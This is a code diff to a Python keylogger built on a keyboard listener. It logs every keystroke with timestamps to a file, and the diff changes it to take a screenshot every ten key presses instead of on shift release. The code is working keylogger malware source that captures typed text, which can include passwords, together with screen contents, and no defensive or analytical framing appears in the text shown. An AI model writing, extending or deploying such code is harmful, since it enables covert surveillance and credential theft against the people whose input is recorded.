@@ -36,8 +36,11 @@ def screenshot_delete():
 log_delete()
 screenshot_delete()
 
+key_count = 0
 
 logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s - %(message)s")
+
+
 
 
 # screenshot function = ss when alt is pressed
@@ -47,20 +50,24 @@ def screenshot():
 
 
 def on_press(key):
+    global key_count
+
     if hasattr(key, 'char'):
         logging.info(f"Key: {key.char} ")
+        key_count += 1
     else:
         logging.info(f"Key: {key} ")
+        key_count += 1
+    if key_count % 10 == 0:
+        screenshot()
 
 
 def on_release(key):
-    if key == keyboard.Key.shift:
-        screenshot()
-    elif key == keyboard.Key.esc:
+    if key == keyboard.Key.esc:
         return False
 
 
-print("Starting listener...")
+print("Starting listener now...")
 
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
